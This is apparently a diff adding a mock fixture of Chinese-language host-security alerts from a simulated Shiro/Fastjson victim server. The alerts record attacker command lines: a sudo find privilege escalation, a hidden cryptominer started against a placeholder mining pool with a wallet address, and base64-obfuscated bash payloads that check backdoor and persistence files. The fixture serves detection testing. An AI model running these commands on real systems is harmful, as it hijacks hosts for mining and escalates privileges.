+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "可疑编码命令",
+      "HasTraceInfo": true,
+      "Id": 800000008,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "suspicious",
+      "Name": "进程异常行为-可疑编码命令",
+      "OccurrenceTime": "2026-04-15 13:33:20",
+      "Stages": "[\"防御绕过\"]"
+    },
+    {
+      "AlarmEventName": "可疑进程启动行为",
+      "AlarmEventNameDisplay": "可疑进程启动",
+      "AlarmEventType": "精准防御",
+      "AlarmEventTypeDisplay": "精准防御",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "疑似病毒木马启动运行。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "在您的系统上发现可疑进程启动行为，通常与病毒木马或入侵事件相关",
+          "ValueDisplay": "在您的系统上发现可疑进程启动行为，通常与病毒木马或入侵事件相关"
+        },
+        {
+          "NameDisplay": "ATT&CK攻击阶段",
+          "Type": "text",
+          "Value": "代码执行",
+          "ValueDisplay": "代码执行"
+        },
+        {
+          "NameDisplay": "恶意行为",
+          "Type": "text",
+          "Value": "异常挖矿命令执行",
+          "ValueDisplay": "异常挖矿命令执行"
+        },
+        {
+          "NameDisplay": "规则类型",
+          "Type": "text",
+          "Value": "进程启动",
+          "ValueDisplay": "进程启动"
+        },
+        {
+          "NameDisplay": "规则引擎",
+          "Type": "text",
+          "Value": "精准攻击识别引擎",
+          "ValueDisplay": "精准攻击识别引擎"
+        },
+        {
+          "NameDisplay": "处置动作",
+          "Type": "text",
+          "Value": "阻断行为",
+          "ValueDisplay": "阻断行为"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/sudo",
+          "ValueDisplay": "/usr/bin/sudo"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "sudo find /tmp -maxdepth 0 -exec bash -c chmod +x /opt/.cache/.java-updater && POOL_ADDR=stratum+tcp://pool.evil-example.invalid:3333 WALLET_ADDR=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;",
+          "ValueDisplay": "sudo find /tmp -maxdepth 0 -exec bash -c chmod +x /opt/.cache/.java-updater && POOL_ADDR=stratum+tcp://pool.evil-example.invalid:3333 WALLET_ADDR=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17404",
+          "ValueDisplay": "17404"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "17403",
+          "ValueDisplay": "17403"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "主动防御检测到可疑进程启动行为，这类可疑进程通常存在于特殊的系统目录，或通过后缀伪装成文档/音频/图片等文件诱导用户运行，该异常行为已被成功拦截",
+          "ValueDisplay": "主动防御检测到可疑进程启动行为，这类可疑进程通常存在于特殊的系统目录，或通过后缀伪装成文档/音频/图片等文件诱导用户运行，该异常行为已被成功拦截"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "请您及时排查是否是正常的业务操作，如果您觉得此次拦截是非预期的，那您可以在主动防御 - 恶意行为防御页面中，关闭“可疑进程启动“规则集或者将受影响机器从管理主机中移除",
+          "ValueDisplay": "请您及时排查是否是正常的业务操作，如果您觉得此次拦截是非预期的，那您可以在主动防御 - 恶意行为防御页面中，关闭“可疑进程启动“规则集或者将受影响机器从管理主机中移除"
+        },
+        {
+          "NameDisplay": "父进程关系",
+          "Type": "processChain",
+          "Value": "17403:::",
+          "ValueDisplay": "17403:::"
+        }
+      ],
+      "EventStatus": 32,
+      "EventSubType": "可疑进程启动行为",
+      "HasTraceInfo": true,
+      "Id": 800000011,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "精准防御-可疑进程启动",
+      "OccurrenceTime": "2026-04-15 13:41:34",
+      "Stages": "[\"代码执行\"]"
+    },
+    {
+      "AlarmEventName": "疑似权限提升",
+      "AlarmEventNameDisplay": "疑似权限提升",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "检测到尝试提升到更高的权限",
+          "ValueDisplay": "检测到尝试提升到更高的权限"
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "该命令疑似通过运行允许Sudo的程序，来获取root权限并执行恶意命令。",
+          "ValueDisplay": "该命令疑似通过运行允许Sudo的程序，来获取root权限并执行恶意命令。"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17660",
+          "ValueDisplay": "17660"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "sudo find /tmp -maxdepth 0 -exec bash -c ls -la /opt/.cache/.java-updater /etc/systemd/system/java-app-monitor.service /etc/profile.d/java-env.sh /etc/sudoers.d/99-java-ops /etc/rc.d/rc.local > /opt/tomcat/webapps/ROOT/.v1.txt 2>&1 ;",
+          "ValueDisplay": "sudo find /tmp -maxdepth 0 -exec bash -c ls -la /opt/.cache/.java-updater /etc/systemd/system/java-app-monitor.service /etc/profile.d/java-env.sh /etc/sudoers.d/99-java-ops /etc/rc.d/rc.local > /opt/tomcat/webapps/ROOT/.v1.txt 2>&1 ;"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "17659",
+          "ValueDisplay": "17659"
+        },
+        {
+          "NameDisplay": "父进程路径",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "-",
+          "ValueDisplay": "-"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17656]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgL2V0Yy9zeXN0ZW1kL3N5c3RlbS9qYXZhLWFwcC1tb25pdG9yLnNlcnZpY2UgL2V0Yy9wcm9maWxlLmQvamF2YS1lbnYuc2ggL2V0Yy9zdWRvZXJzLmQvOTktamF2YS1vcHMgL2V0Yy9yYy5kL3JjLmxvY2FsID4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy52MS50eHQgMj4mMScgXDs=}|{base64,-d}|bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17659]</strong>&nbsp;&nbsp;<code>bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17660]</strong>&nbsp;&nbsp;<code>sudo find /tmp -maxdepth 0 -exec bash -c ls -la /opt/.cache/.java-updater /etc/systemd/system/java-app-monitor.service /etc/profile.d/java-env.sh /etc/sudoers.d/99-java-ops /etc/rc.d/rc.local &gt; /opt/tomcat/webapps/ROOT/.v1.txt 2&gt;&amp;1 ;</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17656]</strong>&nbsp;&nbsp;<code>bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgYmFzaCAtYyAnbHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgL2V0Yy9zeXN0ZW1kL3N5c3RlbS9qYXZhLWFwcC1tb25pdG9yLnNlcnZpY2UgL2V0Yy9wcm9maWxlLmQvamF2YS1lbnYuc2ggL2V0Yy9zdWRvZXJzLmQvOTktamF2YS1vcHMgL2V0Yy9yYy5kL3JjLmxvY2FsID4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy52MS50eHQgMj4mMScgXDs=}|{base64,-d}|bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17659]</strong>&nbsp;&nbsp;<code>bash</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17660]</strong>&nbsp;&nbsp;<code>sudo find /tmp -maxdepth 0 -exec bash -c ls -la /opt/.cache/.java-updater /etc/systemd/system/java-app-monitor.service /etc/profile.d/java-env.sh /etc/sudoers.d/99-java-ops /etc/rc.d/rc.local &gt; /opt/tomcat/webapps/ROOT/.v1.txt 2&gt;&amp;1 ;</code></p>\n"
+        },
+        {
+          "NameDisplay": "事件说明",
+          "Type": "text",
+          "Value": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。",
+          "ValueDisplay": "检测模型发现您的服务器上有进程疑似利用系统、应用漏洞来获取更高的权限，可能是攻击者在入侵过程中进行的提权行为。"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "检测到尝试特权提升的行为。攻击者通常在获取到低权限之后，会尝试提升到更高的权限。",
+          "ValueDisplay": "检测到尝试特权提升的行为。攻击者通常在获取到低权限之后，会尝试提升到更高的权限。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "疑似权限提升",
+      "HasTraceInfo": true,
+      "Id": 800000002,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "进程异常行为-疑似权限提升",
+      "OccurrenceTime": "2026-04-15 13:43:56",
+      "Stages": "[\"权限提升\"]"
+    },
+    {
+      "AlarmEventName": "可疑进程启动行为",
+      "AlarmEventNameDisplay": "可疑进程启动",
+      "AlarmEventType": "精准防御",
+      "AlarmEventTypeDisplay": "精准防御",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "疑似病毒木马启动运行。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "在您的系统上发现可疑进程启动行为，通常与病毒木马或入侵事件相关",
+          "ValueDisplay": "在您的系统上发现可疑进程启动行为，通常与病毒木马或入侵事件相关"
+        },
+        {
+          "NameDisplay": "ATT&CK攻击阶段",
+          "Type": "text",
+          "Value": "代码执行",
+          "ValueDisplay": "代码执行"
+        },
+        {
+          "NameDisplay": "恶意行为",
+          "Type": "text",
+          "Value": "异常挖矿命令执行",
+          "ValueDisplay": "异常挖矿命令执行"
+        },
+        {
+          "NameDisplay": "规则类型",
+          "Type": "text",
+          "Value": "进程启动",
+          "ValueDisplay": "进程启动"
+        },
+        {
+          "NameDisplay": "规则引擎",
+          "Type": "text",
+          "Value": "精准攻击识别引擎",
+          "ValueDisplay": "精准攻击识别引擎"
+        },
+        {
+          "NameDisplay": "处置动作",
+          "Type": "text",
+          "Value": "阻断行为",
+          "ValueDisplay": "阻断行为"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/sudo",
+          "ValueDisplay": "/usr/bin/sudo"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "sudo find /tmp -maxdepth 0 -exec bash -c chmod +x /opt/.cache/.java-updater && POOL_ADDR=stratum+tcp://pool.evil-example.invalid:3333 WALLET_ADDR=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;",
+          "ValueDisplay": "sudo find /tmp -maxdepth 0 -exec bash -c chmod +x /opt/.cache/.java-updater && POOL_ADDR=stratum+tcp://pool.evil-example.invalid:3333 WALLET_ADDR=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft nohup /opt/.cache/.java-updater > /dev/null 2>&1 & ;"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17875",
+          "ValueDisplay": "17875"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "17874",
+          "ValueDisplay": "17874"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "主动防御检测到可疑进程启动行为，这类可疑进程通常存在于特殊的系统目录，或通过后缀伪装成文档/音频/图片等文件诱导用户运行，该异常行为已被成功拦截",
+          "ValueDisplay": "主动防御检测到可疑进程启动行为，这类可疑进程通常存在于特殊的系统目录，或通过后缀伪装成文档/音频/图片等文件诱导用户运行，该异常行为已被成功拦截"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "text",
+          "Value": "请您及时排查是否是正常的业务操作，如果您觉得此次拦截是非预期的，那您可以在主动防御 - 恶意行为防御页面中，关闭“可疑进程启动“规则集或者将受影响机器从管理主机中移除",
+          "ValueDisplay": "请您及时排查是否是正常的业务操作，如果您觉得此次拦截是非预期的，那您可以在主动防御 - 恶意行为防御页面中，关闭“可疑进程启动“规则集或者将受影响机器从管理主机中移除"
+        },
+        {
+          "NameDisplay": "父进程关系",
+          "Type": "processChain",
+          "Value": "17874:::",
+          "ValueDisplay": "17874:::"
+        }
+      ],
+      "EventStatus": 32,
+      "EventSubType": "可疑进程启动行为",
+      "HasTraceInfo": true,
+      "Id": 800000010,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "serious",
+      "Name": "精准防御-可疑进程启动",
+      "OccurrenceTime": "2026-04-15 13:47:25",
+      "Stages": "[\"代码执行\"]"
+    },
+    {
+      "AlarmEventName": "Java应用执行异常指令",
+      "AlarmEventNameDisplay": "Java应用执行异常指令",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上的Java进程启动了下载恶意程序、添加后门等高危行为，很可能是因为您使用了存在漏洞的Web框架或者中间件导致。",
+      "Details": [
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "        该Java进程被利用执行异常命令。\n        \n",
+          "ValueDisplay": "        该Java进程被利用执行异常命令。\n        \n"
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,bHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgPiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4mMTsgcHMgYXV4IHwgZ3JlcCBqYXZhLXVwZGF0ZXIgfCBncmVwIC12IGdyZXAgPj4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy5jaGsudHh0IDI+JjE7IGNhdCAvb3B0Ly5jYWNoZS8uamF2YS11cGRhdGVyLmxvZyA+PiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4vZGV2L251bGw=}|{base64,-d}|bash",
+          "ValueDisplay": "bash -c {echo,bHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgPiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4mMTsgcHMgYXV4IHwgZ3JlcCBqYXZhLXVwZGF0ZXIgfCBncmVwIC12IGdyZXAgPj4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy5jaGsudHh0IDI+JjE7IGNhdCAvb3B0Ly5jYWNoZS8uamF2YS11cGRhdGVyLmxvZyA+PiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4vZGV2L251bGw=}|{base64,-d}|bash"
+        },
+        {
+          "NameDisplay": "进程路径",
+          "Type": "text",
+          "Value": "/usr/bin/bash",
+          "ValueDisplay": "/usr/bin/bash"
+        },
+        {
+          "NameDisplay": "进程ID",
+          "Type": "text",
+          "Value": "17890",
+          "ValueDisplay": "17890"
+        },
+        {
+          "NameDisplay": "父进程命令行",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start"
+        },
+        {
+          "NameDisplay": "父进程文件路径",
+          "Type": "text",
+          "Value": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java",
+          "ValueDisplay": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.412.b08-1.el7_9.x86_64/bin/java"
+        },
+        {
+          "NameDisplay": "父进程ID",
+          "Type": "text",
+          "Value": "4189",
+          "ValueDisplay": "4189"
+        },
+        {
+          "NameDisplay": "进程链",
+          "Type": "html",
+          "Value": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17890]</strong>&nbsp;&nbsp;<code>bash -c {echo,bHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgPiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4mMTsgcHMgYXV4IHwgZ3JlcCBqYXZhLXVwZGF0ZXIgfCBncmVwIC12IGdyZXAgPj4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy5jaGsudHh0IDI+JjE7IGNhdCAvb3B0Ly5jYWNoZS8uamF2YS11cGRhdGVyLmxvZyA+PiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4vZGV2L251bGw=}|{base64,-d}|bash</code></p>\n",
+          "ValueDisplay": "<p>-<strong>[4182]</strong>&nbsp;&nbsp;<code>/bin/sh /opt/tomcat/bin/catalina.sh start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[4189]</strong>&nbsp;&nbsp;<code>/usr/lib/jvm/java-1.8.0-openjdk/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start</code>\n<br  />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-<strong>[17890]</strong>&nbsp;&nbsp;<code>bash -c {echo,bHMgLWxhIC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgPiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4mMTsgcHMgYXV4IHwgZ3JlcCBqYXZhLXVwZGF0ZXIgfCBncmVwIC12IGdyZXAgPj4gL29wdC90b21jYXQvd2ViYXBwcy9ST09ULy5jaGsudHh0IDI+JjE7IGNhdCAvb3B0Ly5jYWNoZS8uamF2YS11cGRhdGVyLmxvZyA+PiAvb3B0L3RvbWNhdC93ZWJhcHBzL1JPT1QvLmNoay50eHQgMj4vZGV2L251bGw=}|{base64,-d}|bash</code></p>\n"
+        },
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程",
+          "ValueDisplay": "Java应用程序创建了异常的子进程"
+        },
+        {
+          "NameDisplay": "描述",
+          "Type": "text",
+          "Value": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。",
+          "ValueDisplay": "Java应用程序创建了异常的子进程，通常Java应用不会创建这些进程。这有可能是攻击者利用应用存在的漏洞执行命令所导致的，也有可能是应用本身的行为。建议根据实际情况进一步判断告警的真实性。"
+        },
+        {
+          "NameDisplay": "处置建议",
+          "Type": "html",
+          "Value": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n",
+          "ValueDisplay": "<ol>\n<li>首先验证告警的准确性。根据告警中的IOC（例如命令行，文件路径、网络等）结合机器上的异常行为或其他告警，判断告警是否为误报。如果是则忽略或加白该告警；如果不是则及时进行处置，避免恶意行为产生进一步的影响。</li>\n<li>调查告警的产生根因。根据告警详情或其他告警的事件说明，还原机器被入侵的原因，修复相关漏洞或清理相关后门，防止攻击者的二次入侵。</li>\n</ol>\n"
+        }
+      ],
+      "EventStatus": 1,
+      "EventSubType": "Java应用执行异常指令",
+      "HasTraceInfo": true,
+      "Id": 800000007,
+      "InstanceId": "i-mock-shiro-fastjson-001",
+      "InstanceName": "range-shiro-fastjson-victim",
+      "InternetIp": "172.18.0.2",
+      "IntranetIp": "172.16.0.100",
+      "Level": "suspicious",
+      "Name": "进程异常行为-Java应用执行异常指令",
+      "OccurrenceTime": "2026-04-15 13:48:07",
+      "Stages": "[\"初始入口\"]"
+    },
+    {
+      "AlarmEventName": "linux可疑命令执行",
+      "AlarmEventNameDisplay": "可疑命令执行",
+      "AlarmEventType": "进程异常行为",
+      "AlarmEventTypeDisplay": "进程异常行为",
+      "AlarmUniqueInfo": "",
+      "CanBeDealOnLine": true,
+      "DataSource": "aegis_suspicious_event",
+      "Desc": "检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。",
+      "Details": [
+        {
+          "NameDisplay": "提示",
+          "Type": "text",
+          "Value": "该进程的命令行异常，与正常进程有较大的区别。",
+          "ValueDisplay": "该进程的命令行异常，与正常进程有较大的区别。"
+        },
+        {
+          "NameDisplay": "告警原因",
+          "Type": "text",
+          "Value": "\t\t  检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。\n          ",
+          "ValueDisplay": "\t\t  检测模型发现您的服务器上执行的进程命令行高度可疑，很有可能与木马、病毒、黑客行为有关。\n          "
+        },
+        {
+          "NameDisplay": "用户名",
+          "Type": "text",
+          "Value": "tomcat",
+          "ValueDisplay": "tomcat"
+        },
+        {
+          "NameDisplay": "命令行",
+          "Type": "text",
+          "Value": "bash -c {echo,c3VkbyBmaW5kIC90bXAgLW1heGRlcHRoIDAgLWV4ZWMgY2htb2QgNzU1IC9vcHQvLmNhY2hlLy5qYXZhLXVwZGF0ZXIgXDs=}|{base64,-d}|bash",
